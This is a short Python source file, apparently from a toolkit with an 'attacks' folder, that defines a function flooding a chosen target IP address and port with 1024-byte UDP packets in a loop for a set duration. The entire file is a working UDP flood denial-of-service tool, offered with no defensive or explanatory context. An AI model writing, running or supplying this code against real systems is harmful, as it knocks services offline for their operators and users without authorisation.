# attacks/udppacket.py

import socket
import time

def attack(target, port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end_time = time.time() + duration

    while time.time() < end_time:
        sock.sendto(b'\x00' * 1024, (target, port))

    sock.close()
